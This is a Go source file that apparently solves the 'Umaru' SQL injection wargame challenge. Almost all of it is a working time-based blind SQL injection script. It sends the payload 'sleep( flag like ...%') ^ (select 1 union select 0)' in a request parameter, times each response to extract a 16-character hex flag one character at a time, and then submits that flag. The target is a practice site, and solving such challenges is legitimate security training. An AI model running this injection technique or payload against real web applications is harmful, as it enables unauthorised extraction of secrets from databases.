package problem

import(
	"fmt"
	"strings"
	"time"
	//"strconv"
)

func find_pw9(file string, length int, session string)string{
	
	result := ""

	NEXT_STR:
	for i := 1 ; i <= length; i += 1 {
		fmt.Println("result : " + result + ".")
		hex_str := "0123456789abcdef"
		for j :=0 ; j< len(hex_str); j += 1 {
			s_pw := "sleep( flag like '"+ result + string(hex_str[j]) +"%') ^ (select 1 union select 0)"
			param := map[string]string{
				"flag" : s_pw,
			}
			
		        t0 := time.Now()
			contents := connect(file, param, session)
		        t1 := time.Now()
			
			if t1.Sub(t0) > (time.Millisecond * 1300){
				result += string(hex_str[j])
				if(string(contents) != ""){
					fmt.Print("")
				}
				continue NEXT_STR
			}
		}
	}
	return result
}


func Umaru(session string){
	file := "umaru_5f885f7ccc40024bc3296c529af5dea7.php"
	
	length := 16

	pw_str := find_pw9(file,length, session)
	//fmt.Println("pw is "+ pw_str + ".")
		
	param := map[string]string{
		"flag" : pw_str,
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"UMARU Clear!"){
		fmt.Println("UMARU Clear!")
	}
}